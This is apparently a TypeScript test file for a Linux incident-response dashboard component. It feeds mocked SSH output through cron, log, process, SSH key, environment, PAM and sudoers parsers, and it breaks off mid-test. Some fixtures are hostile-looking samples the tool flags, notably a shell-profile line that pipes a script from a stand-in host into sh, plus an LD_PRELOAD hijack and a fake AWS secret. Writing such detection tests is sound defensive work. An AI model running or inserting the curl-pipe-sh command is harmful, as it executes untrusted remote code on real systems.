/* @vitest-environment jsdom */

import '@testing-library/jest-dom/vitest';
import { fireEvent, render, screen, waitFor } from '@testing-library/react';
import { afterEach, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest';

import ModuleDetail from './ModuleDetail';

const { invokeMock } = vi.hoisted(() => ({
  invokeMock: vi.fn(),
}));

vi.mock('@tauri-apps/api/core', () => ({
  invoke: invokeMock,
}));

vi.mock('@tauri-apps/plugin-dialog', () => ({
  save: vi.fn(),
}));

vi.mock('@tauri-apps/plugin-fs', () => ({
  writeFile: vi.fn(),
  exists: vi.fn(),
}));

vi.mock('@tauri-apps/api/path', () => ({
  join: vi.fn(),
}));

vi.mock('@tauri-apps/plugin-opener', () => ({
  revealItemInDir: vi.fn(),
}));

beforeAll(() => {
  Object.defineProperty(window, 'matchMedia', {
    writable: true,
    value: vi.fn().mockImplementation((query: string) => ({
      matches: false,
      media: query,
      onchange: null,
      addListener: vi.fn(),
      removeListener: vi.fn(),
      addEventListener: vi.fn(),
      removeEventListener: vi.fn(),
      dispatchEvent: vi.fn(),
    })),
  });

  class ResizeObserverMock {
    observe() {}
    unobserve() {}
    disconnect() {}
  }

  vi.stubGlobal('ResizeObserver', ResizeObserverMock);
});

beforeEach(() => {
  (window as Window & { __TAURI_INTERNALS__?: unknown }).__TAURI_INTERNALS__ = {};
  invokeMock.mockReset();
});

afterEach(() => {
  delete (window as Window & { __TAURI_INTERNALS__?: unknown }).__TAURI_INTERNALS__;
});

function renderRemoteModule(moduleKey: string, stdout: string) {
  invokeMock.mockImplementation(async (command: string) => {
    if (command === 'ssh_execute') {
      return {
        success: true,
        stdout,
        stderr: '',
      };
    }

    throw new Error(`Unexpected command: ${command}`);
  });

  return render(
    <ModuleDetail
      moduleKey={moduleKey}
      mode="remote"
      osType="Linux"
      privilegeMode="none"
      sudoPassword=""
      isDarkMode={false}
      glassEnabled={false}
      wallpaper=""
    />,
  );
}

function renderRemoteSystemInfo(commandOutputs: Record<string, string>) {
  invokeMock.mockImplementation(async (command: string, args?: { command?: string }) => {
    if (command === 'ssh_execute') {
      return {
        success: true,
        stdout: commandOutputs[args?.command || ''] ?? '',
        stderr: '',
      };
    }

    throw new Error(`Unexpected command: ${command}`);
  });

  render(
    <ModuleDetail
      moduleKey="system_info"
      mode="remote"
      osType="Linux"
      privilegeMode="none"
      sudoPassword=""
      isDarkMode={false}
      glassEnabled={false}
      wallpaper=""
    />,
  );
}

describe('ModuleDetail Linux remote module rendering', () => {
  it('summarizes remote Linux host health and next analysis actions', async () => {
    renderRemoteSystemInfo({
      hostname: 'prod-web-01',
      'cat /etc/os-release 2>/dev/null': [
        'NAME="Ubuntu"',
        'VERSION="22.04.4 LTS (Jammy Jellyfish)"',
        'PRETTY_NAME="Ubuntu 22.04.4 LTS"',
        'VERSION_ID="22.04"',
      ].join('\n'),
      uptime: ' 07:50:01 up 14 days,  3:20,  2 users,  load average: 3.80, 2.40, 1.90',
      'free -h | grep Mem': 'Mem: 7.7G 6.9G 300M 120M 500M 450M',
      'df -h | grep -E "^/dev"': [
        '/dev/sda1 40G 37G 3G 93% /',
        '/dev/sdb1 100G 40G 60G 40% /data',
      ].join('\n'),
      nproc: '2',
      'hostname -I 2>/dev/null | awk \'{print $1}\' || ip addr show | grep "inet " | head -1 | awk \'{print $2}\'': '10.0.0.5',
      'uname -r': '5.15.0-105-generic',
      'uname -m': 'x86_64',
      'cat /proc/cpuinfo | grep "model name" | head -1 | cut -d: -f2': ' Intel(R) Xeon(R)',
      'cat /etc/issue 2>/dev/null | head -1': 'Ubuntu 22.04.4 LTS \\n \\l',
      'cat /etc/redhat-release 2>/dev/null || cat /etc/centos-release 2>/dev/null || cat /etc/system-release 2>/dev/null': '',
    });

    await waitFor(() => {
      expect(screen.getAllByText('prod-web-01').length).toBeGreaterThan(0);
      // 新版 UI 重构为扁平化布局，显示关键指标
      expect(screen.getByText('运行时间')).toBeInTheDocument();
      expect(screen.getByText('负载')).toBeInTheDocument();
      expect(screen.getByText('内存')).toBeInTheDocument();
      expect(screen.getByText('资源监控')).toBeInTheDocument();
      expect(screen.getByText('系统负载 (1min)')).toBeInTheDocument();
      expect(screen.getByText('内存使用')).toBeInTheDocument();
      expect(screen.getByText('磁盘数量')).toBeInTheDocument();
    });
  });

  it('marks Linux host overview as collected when remote system info is loaded', async () => {
    renderRemoteSystemInfo({
      hostname: 'prod-web-01',
      'cat /etc/os-release 2>/dev/null': [
        'NAME="Ubuntu"',
        'VERSION="22.04.4 LTS (Jammy Jellyfish)"',
        'PRETTY_NAME="Ubuntu 22.04.4 LTS"',
        'VERSION_ID="22.04"',
      ].join('\n'),
      uptime: ' 07:50:01 up 14 days,  3:20,  2 users,  load average: 3.80, 2.40, 1.90',
      'free -h | grep Mem': 'Mem: 7.7G 6.9G 300M 120M 500M 450M',
      'df -h | grep -E "^/dev"': '/dev/sda1 40G 37G 3G 93% /',
      nproc: '2',
      'hostname -I 2>/dev/null | awk \'{print $1}\' || ip addr show | grep "inet " | head -1 | awk \'{print $2}\'': '10.0.0.5',
      'uname -r': '5.15.0-105-generic',
      'uname -m': 'x86_64',
      'cat /proc/cpuinfo | grep "model name" | head -1 | cut -d: -f2': ' Intel(R) Xeon(R)',
      'cat /etc/issue 2>/dev/null | head -1': 'Ubuntu 22.04.4 LTS \\n \\l',
      'cat /etc/redhat-release 2>/dev/null || cat /etc/centos-release 2>/dev/null || cat /etc/system-release 2>/dev/null': '',
    });

    await waitFor(() => expect(screen.getAllByText('prod-web-01').length).toBeGreaterThan(0));
    expect(screen.queryByText('等待采集')).not.toBeInTheDocument();
    expect(screen.queryByText('已采集')).not.toBeInTheDocument();
  });

  it('shows a clear diagnostic when a remote module cannot collect data because of permissions', async () => {
    renderRemoteModule(
      'cron',
      'cat: /var/spool/cron/root: Permission denied',
    );

    await waitFor(() => {
      expect(screen.getByText('采集诊断')).toBeInTheDocument();
      expect(screen.getByText('权限不足')).toBeInTheDocument();
      expect(screen.getByText(/sudo 或 root/)).toBeInTheDocument();
      expect(screen.getByText(/Permission denied/)).toBeInTheDocument();
    });
  });

  it('shows an explicit empty-state diagnostic when a remote module returns only section headers', async () => {
    renderRemoteModule(
      'cron',
      [
        '===USER_CRONTAB:root===',
        '===ETC_CRONTAB===',
        '===SYSTEMD_TIMERS===',
      ].join('\n'),
    );

    await waitFor(() => {
      expect(screen.getByText('采集诊断')).toBeInTheDocument();
      expect(screen.getByText('未发现记录')).toBeInTheDocument();
      expect(screen.getByText(/命令已成功执行/)).toBeInTheDocument();
    });
  });

  it('uses the Linux analysis workbench shell for collected table modules', async () => {
    const { container } = renderRemoteModule(
      'process_list',
      [
        'root 101 2.4 1.2 123456 45678 ? Ss 10:00 0:02 nginx: master process',
        'www-data 202 0.8 2.5 234567 67890 ? S 10:01 0:01 php-fpm',
      ].join('\n'),
    );

    await waitFor(() => {
      expect(screen.getByRole('heading', { name: '进程列表' })).toBeInTheDocument();
      expect(screen.getByText('远程主机运行进程、资源占用和命令基线。')).toBeInTheDocument();
    });

    expect(container.querySelector('.linux-module-shell')).toBeInTheDocument();
    expect(container.querySelector('.windows-data-workbench')).toBeInTheDocument();
    expect(container.querySelector('.windows-module-table')).toBeInTheDocument();
  });

  it('shows a Linux-specific workbench header and toolbar for collected table modules', async () => {
    const { container } = renderRemoteModule(
      'process_list',
      [
        'root 101 2.4 1.2 123456 45678 ? Ss 10:00 0:02 nginx: master process',
        'www-data 202 0.8 2.5 234567 67890 ? S 10:01 0:01 php-fpm',
      ].join('\n'),
    );

    await waitFor(() => {
      expect(screen.getByText('共 1 条')).toBeInTheDocument();
    });

    expect(container.querySelector('.linux-module-header')).toBeInTheDocument();
    expect(container.querySelector('.linux-module-header')?.textContent).not.toContain('1 条结果');
    expect(container.querySelector('.windows-data-toolbar')).toBeInTheDocument();
    expect(container.querySelector('.windows-data-toolbar')?.textContent).toContain('共 1 条');
    expect(screen.getByPlaceholderText('搜索关键字...')).toBeInTheDocument();
  });

  it('hides success-state collection and tool tags for collected Linux modules', async () => {
    const { container } = renderRemoteModule(
      'process_list',
      [
        'root 101 2.4 1.2 123456 45678 ? Ss 10:00 0:02 nginx: master process',
        'www-data 202 0.8 2.5 234567 67890 ? S 10:01 0:01 php-fpm',
      ].join('\n'),
    );

    await waitFor(() => expect(screen.getByText('共 1 条')).toBeInTheDocument());

    expect(container.querySelector('.linux-module-header')?.textContent).not.toContain('已采集');
    expect(container.querySelector('.linux-module-header')?.textContent).not.toContain('SSH Shell');
  });

  it('shows systemd and init.d startup entries with source and command details', async () => {
    renderRemoteModule(
      'startup',
      [
        '===SYSTEMD_ENABLED===',
        'ssh.service enabled enabled OpenBSD Secure Shell server',
        'nginx.service enabled enabled A high performance web server',
        '===INIT_D===',
        'apache2',
        'rc.local',
      ].join('\n'),
    );

    await waitFor(() => {
      expect(screen.getByText('ssh.service')).toBeInTheDocument();
      expect(screen.getByText('nginx.service')).toBeInTheDocument();
      expect(screen.getByText('apache2')).toBeInTheDocument();
      expect(screen.getByText('/etc/init.d/apache2')).toBeInTheDocument();
      expect(screen.getAllByText('init.d').length).toBeGreaterThan(0);
    });
  });

  it('shows cron source, user, schedule, and command from multiple Linux cron locations', async () => {
    renderRemoteModule(
      'cron',
      [
        '===USER_CRONTAB:root===',
        '*/5 * * * * /usr/local/bin/backup.sh',
        '===ETC_CRONTAB===',
        '17 * * * * root cd / && run-parts --report /etc/cron.hourly',
        '===CRON_D:cleanup===',
        '0 3 * * * root /usr/local/bin/cleanup.sh',
      ].join('\n'),
    );

    await waitFor(() => {
      expect(screen.getAllByText('root').length).toBeGreaterThan(0);
      expect(screen.getByText('*/5 * * * *')).toBeInTheDocument();
      expect(screen.getByText('/usr/local/bin/backup.sh')).toBeInTheDocument();
      expect(screen.getByText('cleanup')).toBeInTheDocument();
      expect(screen.getByText('/usr/local/bin/cleanup.sh')).toBeInTheDocument();
    });
  });

  it('shows systemd timers, cron directory scripts, and spool cron entries', async () => {
    renderRemoteModule(
      'cron',
      [
        '===SYSTEMD_TIMERS===',
        'Tue 2026-05-26 20:00:00 CST 1h left Tue 2026-05-26 19:00:00 CST 1h ago apt-daily.timer apt-daily.service',
        '===CRON_DIR:/etc/cron.daily===',
        'logrotate',
        'backup-agent',
        '===SPOOL_CRON:www-data===',
        '30 2 * * * /var/www/scripts/nightly.sh',
      ].join('\n'),
    );

    await waitFor(() => {
      expect(screen.getAllByText('systemd timer').length).toBeGreaterThan(0);
      expect(screen.getByText('apt-daily.timer')).toBeInTheDocument();
      expect(screen.getAllByText('apt-daily.service').length).toBeGreaterThan(0);
      expect(screen.getAllByText('/etc/cron.daily').length).toBeGreaterThan(0);
      expect(screen.getByText('/etc/cron.daily/logrotate')).toBeInTheDocument();
      expect(screen.getAllByText('www-data').length).toBeGreaterThan(0);
      expect(screen.getByText('/var/www/scripts/nightly.sh')).toBeInTheDocument();
    });
  });

  it('shows SysV service fallback output with normalized service states', async () => {
    renderRemoteModule(
      'service_list',
      [
        ' [ + ]  cron',
        ' [ - ]  apache2',
        ' [ ? ]  custom-agent',
      ].join('\n'),
    );

    await waitFor(() => {
      expect(screen.getByText('cron')).toBeInTheDocument();
      expect(screen.getByText('apache2')).toBeInTheDocument();
      expect(screen.getByText('custom-agent')).toBeInTheDocument();
      expect(screen.getByText('running')).toBeInTheDocument();
      expect(screen.getByText('stopped')).toBeInTheDocument();
    });
  });

  it('shows Linux listening port pid and process name from ss output', async () => {
    renderRemoteModule(
      'listen_ports',
      [
        'State Recv-Q Send-Q Local Address:Port Peer Address:Port Process',
        'LISTEN 0 4096 0.0.0.0:22 0.0.0.0:* users:(("sshd",pid=123,fd=3))',
        'LISTEN 0 511 [::]:80 [::]:* users:(("nginx",pid=456,fd=6))',
      ].join('\n'),
    );

    await waitFor(() => {
      expect(screen.getByText('0.0.0.0:22')).toBeInTheDocument();
      expect(screen.getByText('[::]:80')).toBeInTheDocument();
      expect(screen.getByText('123')).toBeInTheDocument();
      expect(screen.getByText('456')).toBeInTheDocument();
      expect(screen.getByText('sshd')).toBeInTheDocument();
      expect(screen.getByText('nginx')).toBeInTheDocument();
    });
  });

  it('shows Linux logged user session details from who -u and last output', async () => {
    renderRemoteModule(
      'logged_users',
      [
        'analyst pts/0 2026-05-26 20:10 00:03 1234 (203.0.113.10)',
        'deploy pts/1 2026-05-26 19:50 old 2456 (10.0.0.5)',
        '---LAST---',
        'analyst pts/0 203.0.113.10 Tue May 26 20:10 still logged in',
        'deploy pts/1 10.0.0.5 Tue May 26 18:00 - 18:45 (00:45)',
      ].join('\n'),
    );

    await waitFor(() => {
      expect(screen.getAllByText('analyst').length).toBeGreaterThan(0);
      expect(screen.getByText('1234')).toBeInTheDocument();
      expect(screen.getAllByText('00:03').length).toBeGreaterThan(0);
      expect(screen.getAllByText('Active').length).toBeGreaterThan(0);
      expect(screen.getAllByText('203.0.113.10').length).toBeGreaterThan(0);
      expect(screen.getByText('2456')).toBeInTheDocument();
      expect(screen.getAllByText('old').length).toBeGreaterThan(0);
      expect(screen.getByText('00:45')).toBeInTheDocument();
    });
  });

  it('extracts invalid SSH usernames and source IPs from failed login logs', async () => {
    renderRemoteModule(
      'failed_logins',
      [
        'May 26 12:14:01 host sshd[2451]: Failed password for invalid user deploy from 203.0.113.9 port 52222 ssh2',
        'May 26 12:15:10 host sshd[2460]: Failed password for root from 198.51.100.7 port 40000 ssh2',
      ].join('\n'),
    );

    await waitFor(() => {
      expect(screen.getByText('deploy')).toBeInTheDocument();
      expect(screen.getByText('root')).toBeInTheDocument();
      expect(screen.getByText('203.0.113.9')).toBeInTheDocument();
      expect(screen.getByText('198.51.100.7')).toBeInTheDocument();
    });
  });

  it('shows Linux network connection pid and process name from ss output', async () => {
    renderRemoteModule(
      'network_conn',
      [
        'Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process',
        'tcp ESTAB 0 0 10.0.0.5:22 203.0.113.10:54420 users:(("sshd",pid=991,fd=4))',
        'udp UNCONN 0 0 0.0.0.0:68 0.0.0.0:* users:(("dhclient",pid=777,fd=6))',
      ].join('\n'),
    );

    await waitFor(() => {
      expect(screen.getByText('10.0.0.5:22')).toBeInTheDocument();
      expect(screen.getByText('203.0.113.10:54420')).toBeInTheDocument();
      expect(screen.getByText('991')).toBeInTheDocument();
      expect(screen.getByText('777')).toBeInTheDocument();
      expect(screen.getByText('sshd')).toBeInTheDocument();
      expect(screen.getByText('dhclient')).toBeInTheDocument();
    });
  });

  it('shows SSH key filenames, types, owners, and full paths consistently', async () => {
    renderRemoteModule(
      'ssh_keys',
      [
        'total 16',
        '-rw------- 1 root root 399 May 26 12:00 authorized_keys',
        '-rw------- 1 root root 411 May 26 12:01 id_ed25519',
        '-rw-r--r-- 1 root root 99 May 26 12:02 id_ed25519.pub',
      ].join('\n'),
    );

    await waitFor(() => {
      expect(screen.getByText('authorized_keys')).toBeInTheDocument();
      expect(screen.getByText('private key')).toBeInTheDocument();
      expect(screen.getByText('public key')).toBeInTheDocument();
      expect(screen.getByText('/root/.ssh/id_ed25519')).toBeInTheDocument();
    });
  });

  it('shows Linux package inventory from rpm, pacman, and apk style output', async () => {
    renderRemoteModule(
      'installed_software',
      [
        'bash-5.1.8-6.el9.x86_64',
        'openssh 9.7p1-1',
        'busybox-1.36.1-r15',
      ].join('\n'),
    );

    await waitFor(() => {
      expect(screen.getByText('bash')).toBeInTheDocument();
      expect(screen.getByText('5.1.8-6.el9')).toBeInTheDocument();
      expect(screen.getByText('openssh')).toBeInTheDocument();
      expect(screen.getByText('9.7p1-1')).toBeInTheDocument();
      expect(screen.getByText('busybox')).toBeInTheDocument();
      expect(screen.getByText('1.36.1-r15')).toBeInTheDocument();
    });
  });

  it('renders MySQL database inventory, users, and tab-separated datadir output', async () => {
    renderRemoteModule(
      'database',
      [
        '===MYSQL_VERSION===',
        'mysql  Ver 8.0.36 for Linux on x86_64',
        '===MYSQL_STATUS===',
        'Active: active (running) since Tue 2026-05-26 18:30:00 CST',
        '===MYSQL_DATABASES===',
        'Database',
        'appdb',
        'auditdb',
        '===MYSQL_USERS===',
        'user\thost',
        'root\tlocalhost',
        'app\t%',
        '===MYSQL_DATADIR===',
        'Variable_name\tValue',
        'datadir\t/var/lib/mysql/',
      ].join('\n'),
    );

    await waitFor(() => {
      expect(screen.getByText(/mysql\s+Ver 8\.0\.36 for Linux on x86_64/)).toBeInTheDocument();
      expect(screen.getByText('/var/lib/mysql/')).toBeInTheDocument();
      expect(screen.getByText('appdb')).toBeInTheDocument();
      expect(screen.getByText('auditdb')).toBeInTheDocument();
      expect(screen.getAllByText('root').length).toBeGreaterThan(0);
      expect(screen.getByText('localhost')).toBeInTheDocument();
      expect(screen.getByText('%')).toBeInTheDocument();
    });
  });

  it('structures auth, sudo, and web access log fields', async () => {
    renderRemoteModule(
      'auth_log',
      'May 26 12:16:01 prod sshd[2501]: Accepted publickey for deploy from 203.0.113.11 port 51234 ssh2',
    );

    await waitFor(() => {
      expect(screen.getAllByText('prod').length).toBeGreaterThan(0);
      expect(screen.getByText('sshd[2501]')).toBeInTheDocument();
      expect(screen.getByText(/Accepted publickey for deploy/)).toBeInTheDocument();
    });
  });

  it('shows sudo cwd, target user, and command details', async () => {
    renderRemoteModule(
      'sudo_log',
      'May 26 12:17:22 prod sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx',
    );

    await waitFor(() => {
      expect(screen.getByText('deploy')).toBeInTheDocument();
      expect(screen.getByText('/home/deploy')).toBeInTheDocument();
      expect(screen.getByText('root')).toBeInTheDocument();
      expect(screen.getByText('/usr/bin/systemctl restart nginx')).toBeInTheDocument();
    });
  });

  it('shows a diagnostic when sudo logs are readable but contain no sudo records', async () => {
    renderRemoteModule(
      'sudo_log',
      'May 26 12:19:22 prod sshd[2501]: Accepted publickey for deploy from 203.0.113.11 port 51234 ssh2',
    );

    await waitFor(() => {
      expect(screen.getByText('采集诊断')).toBeInTheDocument();
      expect(screen.getByText('未发现记录')).toBeInTheDocument();
      expect(screen.getByText(/没有匹配到 sudo 提权记录/)).toBeInTheDocument();
    });
  });

  it('shows web access referer and user agent', async () => {
    renderRemoteModule(
      'web_access_log',
      '203.0.113.12 - - [26/May/2026:12:18:00 +0800] "GET /admin HTTP/1.1" 404 123 "-" "Mozilla/5.0"',
    );

    await waitFor(() => {
      expect(screen.getByText('203.0.113.12')).toBeInTheDocument();
      expect(screen.getByText('/admin')).toBeInTheDocument();
      expect(screen.getByText('404')).toBeInTheDocument();
      expect(screen.getByText('Mozilla/5.0')).toBeInTheDocument();
    });
  });

  it('structures Linux syslog entries with process, source, and severity', async () => {
    renderRemoteModule(
      'syslog',
      [
        'May 26 12:20:01 prod kernel: EXT4-fs error (device sda1): inode failure',
        'May 26 12:20:02 prod CRON[321]: (root) CMD (/usr/bin/backup)',
      ].join('\n'),
    );

    await waitFor(() => {
      expect(screen.getAllByText('prod').length).toBeGreaterThan(0);
      expect(screen.getByText('kernel')).toBeInTheDocument();
      expect(screen.getByText('CRON[321]')).toBeInTheDocument();
      expect(screen.getAllByText('syslog').length).toBeGreaterThan(0);
      expect(screen.getAllByText('error').length).toBeGreaterThan(0);
      expect(screen.getAllByText('info').length).toBeGreaterThan(0);
    });
  });

  it('offers structured log columns in the column settings popover', async () => {
    renderRemoteModule(
      'syslog',
      'May 26 12:20:01 prod kernel: EXT4-fs error (device sda1): inode failure',
    );

    await waitFor(() => {
      expect(screen.getByText('kernel')).toBeInTheDocument();
    });

    fireEvent.click(screen.getByRole('button', { name: /设置列/ }));

    await waitFor(() => {
      expect(screen.getAllByText('Source').length).toBeGreaterThan(0);
      expect(screen.getAllByText('Severity').length).toBeGreaterThan(0);
    });
  });

  it('offers lastlog-specific columns in the column settings popover', async () => {
    renderRemoteModule(
      'lastlog',
      [
        'Username         Port     From             Latest',
        'root             pts/0    203.0.113.8      Tue May 26 19:00:00 +0800 2026',
      ].join('\n'),
    );

    await waitFor(() => {
      expect(screen.getByText('203.0.113.8')).toBeInTheDocument();
    });

    fireEvent.click(screen.getByRole('button', { name: /设置列/ }));

    await waitFor(() => {
      expect(screen.getByText('Port')).toBeInTheDocument();
      expect(screen.getByText('Latest')).toBeInTheDocument();
      expect(screen.queryByText('Logout')).not.toBeInTheDocument();
    });
  });

  it('shows a diagnostic when lastlog has no recorded logins', async () => {
    renderRemoteModule(
      'lastlog',
      [
        'Username         Port     From             Latest',
        'daemon                                     **Never logged in**',
        'bin                                        **Never logged in**',
      ].join('\n'),
    );

    await waitFor(() => {
      expect(screen.getByText('采集诊断')).toBeInTheDocument();
      expect(screen.getByText('未发现记录')).toBeInTheDocument();
      expect(screen.getByText(/lastlog 可读取/)).toBeInTheDocument();
    });
  });

  it('shows a diagnostic when SSH key directories contain no key files', async () => {
    renderRemoteModule(
      'ssh_keys',
      [
        '===SSH_DIR:~/.ssh===',
        'total 0',
        '===SSH_DIR:/root/.ssh===',
        'total 0',
      ].join('\n'),
    );

    await waitFor(() => {
      expect(screen.getByText('采集诊断')).toBeInTheDocument();
      expect(screen.getByText('未发现记录')).toBeInTheDocument();
      expect(screen.getByText(/ssh_keys/)).toBeInTheDocument();
    });
  });

  it('shows a diagnostic when hosts file has only comments', async () => {
    renderRemoteModule(
      'hosts_file',
      [
        '# /etc/hosts managed by cloud-init',
        '# no static host entries',
      ].join('\n'),
    );

    await waitFor(() => {
      expect(screen.getByText('采集诊断')).toBeInTheDocument();
      expect(screen.getByText('未发现记录')).toBeInTheDocument();
      expect(screen.getByText(/hosts_file/)).toBeInTheDocument();
    });
  });

  it('shows a diagnostic when DNS config has only comments', async () => {
    renderRemoteModule(
      'dns_config',
      [
        '# Generated by NetworkManager',
        '# no nameserver configured',
      ].join('\n'),
    );

    await waitFor(() => {
      expect(screen.getByText('采集诊断')).toBeInTheDocument();
      expect(screen.getByText('未发现记录')).toBeInTheDocument();
      expect(screen.getByText(/dns_config/)).toBeInTheDocument();
    });
  });

  it('shows a diagnostic when cron journal reports no entries', async () => {
    renderRemoteModule('cron_log', '-- No entries --');

    await waitFor(() => {
      expect(screen.getByText('采集诊断')).toBeInTheDocument();
      expect(screen.getByText('未发现记录')).toBeInTheDocument();
      expect(screen.getByText(/cron_log/)).toBeInTheDocument();
    });
  });

  it('shows a diagnostic when PAM output contains only directory listing noise', async () => {
    renderRemoteModule(
      'pam_config',
      [
        'total 0',
        'drwxr-xr-x 2 root root 40 May 26 12:00 .',
        'drwxr-xr-x 3 root root 60 May 26 12:00 ..',
        '===COMMON_AUTH===',
        '===SSHD===',
      ].join('\n'),
    );

    await waitFor(() => {
      expect(screen.getByText('采集诊断')).toBeInTheDocument();
      expect(screen.getByText('未发现记录')).toBeInTheDocument();
      expect(screen.getByText(/pam_config/)).toBeInTheDocument();
    });
  });

  it('offers process anomaly columns that match parsed anomaly records', async () => {
    renderRemoteModule(
      'process_anomaly',
      [
        '===SENSITIVE_PATH===',
        '1234 root /tmp/payload.sh',
      ].join('\n'),
    );

    await waitFor(() => {
      expect(screen.getByText('/tmp/payload.sh')).toBeInTheDocument();
    });

    fireEvent.click(screen.getByRole('button', { name: /设置列/ }));

    await waitFor(() => {
      expect(screen.getByText('Type')).toBeInTheDocument();
      expect(screen.getByText('Path')).toBeInTheDocument();
      expect(screen.getByText('Detail')).toBeInTheDocument();
      expect(screen.getByText('Severity')).toBeInTheDocument();
      expect(screen.queryByText('Reason')).not.toBeInTheDocument();
    });
  });

  it('exports CSV using visible configured columns instead of raw object keys', async () => {
    let exportedBlob: Blob | undefined;
    Object.defineProperty(URL, 'createObjectURL', {
      writable: true,
      value: vi.fn((blob: Blob) => {
        exportedBlob = blob;
        return 'blob:test-csv';
      }),
    });
    Object.defineProperty(URL, 'revokeObjectURL', {
      writable: true,
      value: vi.fn(),
    });

    renderRemoteModule(
      'syslog',
      'May 26 12:20:01 prod kernel: EXT4-fs error (device sda1): inode failure',
    );

    await waitFor(() => {
      expect(screen.getByText('kernel')).toBeInTheDocument();
    });

    fireEvent.click(screen.getByRole('button', { name: /设置列/ }));
    fireEvent.click(screen.getByRole('checkbox', { name: 'Host' }));
    fireEvent.click(screen.getByRole('button', { name: /导出/ }));

    await waitFor(() => {
      expect(exportedBlob).toBeDefined();
    });

    const csv = await new Promise<string>((resolve, reject) => {
      const reader = new FileReader();
      reader.onload = () => resolve(String(reader.result));
      reader.onerror = () => reject(reader.error);
      reader.readAsText(exportedBlob!);
    });
    expect(csv).toContain('Time,Source,Severity,Process,Message');
    expect(csv).not.toContain('Host');
    expect(csv).not.toContain('raw');
    expect(csv).not.toContain('prod');
    expect(csv).toContain('"kernel"');
    expect(csv).toContain('"EXT4-fs error (device sda1): inode failure"');
  });

  it('structures Linux dmesg timestamps and kernel severity', async () => {
    renderRemoteModule(
      'dmesg',
      [
        '[2026-05-26T12:21:00.000000+08:00] EXT4-fs error (device sda1): failed mount',
        '[Tue May 26 12:22:00 2026] audit: apparmor="DENIED" profile="nginx"',
      ].join('\n'),
    );

    await waitFor(() => {
      expect(screen.getByText('2026-05-26T12:21:00.000000+08:00')).toBeInTheDocument();
      expect(screen.getByText('Tue May 26 12:22:00 2026')).toBeInTheDocument();
      expect(screen.getAllByText('kernel').length).toBeGreaterThan(0);
      expect(screen.getAllByText('dmesg').length).toBeGreaterThan(0);
      expect(screen.getAllByText('error').length).toBeGreaterThan(0);
    });
  });

  it('shows Linux login history logout time and session state', async () => {
    renderRemoteModule(
      'login_history',
      [
        'deploy pts/0 203.0.113.9 Tue May 26 18:00:00 2026 - Tue May 26 18:45:00 2026 (00:45)',
        'root pts/1 198.51.100.7 Tue May 26 19:00:00 2026 still logged in',
      ].join('\n'),
    );

    await waitFor(() => {
      expect(screen.getByText('deploy')).toBeInTheDocument();
      expect(screen.getByText('203.0.113.9')).toBeInTheDocument();
      expect(screen.getByText('Tue May 26 18:00:00 2026')).toBeInTheDocument();
      expect(screen.getByText('Tue May 26 18:45:00 2026')).toBeInTheDocument();
      expect(screen.getByText('00:45')).toBeInTheDocument();
      expect(screen.getByText('active')).toBeInTheDocument();
    });
  });

  it('flags sensitive and risky Linux environment variables', async () => {
    renderRemoteModule(
      'env_vars',
      [
        'PATH=/tmp:/usr/local/bin:/usr/bin',
        'AWS_SECRET_ACCESS_KEY=abc123',
        'LD_PRELOAD=/tmp/libhack.so',
        'HOME=/root',
      ].join('\n'),
    );

    await waitFor(() => {
      expect(screen.getByText('AWS_SECRET_ACCESS_KEY')).toBeInTheDocument();
      expect(screen.getByText('credential')).toBeInTheDocument();
      expect(screen.getByText('dynamic-loader')).toBeInTheDocument();
      expect(screen.getByText('path-risk')).toBeInTheDocument();
      expect(screen.getAllByText('high').length).toBeGreaterThan(0);
      expect(screen.getAllByText('warning').length).toBeGreaterThan(0);
    });
  });

  it('structures Linux firewall rules with source, chain, action, protocol, and port', async () => {
    renderRemoteModule(
      'firewall',
      [
        'Chain INPUT (policy DROP)',
        'target prot opt source destination',
        'ACCEPT tcp -- 0.0.0.0/0 0.0.0.0/0 tcp dpt:22',
        'DROP all -- 203.0.113.4 0.0.0.0/0',
      ].join('\n'),
    );

    await waitFor(() => {
      expect(screen.getAllByText('iptables').length).toBeGreaterThan(0);
      expect(screen.getAllByText('INPUT').length).toBeGreaterThan(0);
      expect(screen.getByText('ACCEPT')).toBeInTheDocument();
      expect(screen.getAllByText('DROP').length).toBeGreaterThan(0);
      expect(screen.getByText('tcp')).toBeInTheDocument();
      expect(screen.getByText('22')).toBeInTheDocument();
    });
  });

  it('extracts suspicious shell profile directives instead of showing only raw text', async () => {
    renderRemoteModule(
      'bashrc_check',
      [
        '===ROOT===',
        'alias ll="ls -la"',
        'export PATH=/tmp:$PATH',
        'curl http://example.test/payload.sh | sh',
        '===USERS===',
        'source /tmp/.agent',
      ].join('\n'),
    );

    await waitFor(() => {
      expect(screen.getAllByText('ROOT').length).toBeGreaterThan(0);
      expect(screen.getByText('alias')).toBeInTheDocument();
      expect(screen.getByText('environment')).toBeInTheDocument();
      expect(screen.getByText('remote-script')).toBeInTheDocument();
      expect(screen.getByText('source')).toBeInTheDocument();
      expect(screen.getByText('/tmp/.agent')).toBeInTheDocument();
    });
  });

  it('extracts PAM service, type, control, module, and security note', async () => {
    renderRemoteModule(
      'pam_config',
      [
        '===COMMON_AUTH===',
        'auth required pam_tally2.so deny=5 unlock_time=600',
        '===SSHD===',
        'auth required pam_google_authenticator.so nullok',
      ].join('\n'),
    );

    await waitFor(() => {
      expect(screen.getByText('COMMON_AUTH')).toBeInTheDocument();
      expect(screen.getByText('SSHD')).toBeInTheDocument();
      expect(screen.getByText('pam_tally2.so')).toBeInTheDocument();
      expect(screen.getByText('pam_google_authenticator.so')).toBeInTheDocument();
      expect(screen.getByText('lockout')).toBeInTheDocument();
      expect(screen.getByText('optional-mfa')).toBeInTheDocument();
    });
  });

  it('extracts sudoers principals, hosts, run-as, command, and risk', async () => {
    renderRemoteModule(
      'sudoers_config',
      [
        'root ALL=(ALL:ALL) ALL',
        '%admin ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart nginx',
      ].join('\n'),
    );

    await waitFor(() => {
      expect(screen.getByText('root')).toBeInTheDocument();
      expect(screen.getByText('%admin')).toBeInTheDocument();
      expect(screen.getAllByText('ALL').length).toBeGreaterThan(0);
      expect(screen.getByText('(ALL)')).toBeInTheDocument();
      expect(screen.getByText('/usr/bin/systemctl restart nginx')).toBeInTheDocument();
      expect(screen.getByText('nopasswd')).toBeInTheDocument();
    });
  });

  it('structures Sudo configuration menu output with sudoers fields', async () => {
    renderRemoteModule(
      'sudo_config',
      [
        'root ALL=(ALL:ALL) ALL',
